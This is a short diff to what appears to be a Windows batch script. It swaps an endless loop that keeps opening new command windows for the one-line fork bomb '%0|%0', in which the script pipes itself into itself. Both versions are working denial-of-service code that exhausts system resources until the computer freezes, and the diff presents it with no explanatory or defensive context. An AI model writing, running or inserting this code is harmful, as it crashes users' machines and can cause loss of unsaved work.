@@ -1,4 +1,1 @@
-@echo off
-:a
-start
-goto a
+%0|%0
